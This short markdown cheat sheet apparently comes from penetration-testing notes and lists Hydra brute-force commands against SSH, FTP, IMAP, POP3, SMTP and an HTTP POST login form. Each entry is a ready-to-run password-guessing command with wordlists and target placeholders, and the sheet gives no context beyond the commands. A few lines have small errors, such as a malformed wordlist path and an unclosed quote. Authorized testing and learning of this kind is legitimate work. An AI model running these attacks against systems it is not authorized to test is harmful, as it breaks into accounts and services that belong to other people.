# Hydra

**SSH Bruteforce:**

```sh
hydra -L users.txt -P pass.txt IP ssh
```

**FTP Bruteforce:**

```sh
hydra -l user -P passlist.txt ftp://192.168.0.1
```

**IMAP Bruteforce:**

```
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
```

**POP3 Bruteforce:**
```
hydra -C defaults.txt -6 pop3s://[fe80::2c:31ff:fe12:ac11]:143/TLS:DIGEST-MD5
```

**HTTP POST form bruteforce:**
```
hydra -L users.txt -P pass.txt <IP> -s <PORT> http-post-form "/users/sign_in:user[email]=^USER^&user[password]=^PASS^&user[Commit]=Log inn:Invalid Email or password.
```

**SMTP Bruteforce:**

```
hydra -P /usr/share/wordlistsnmap.lst <IP> smtp -V
```
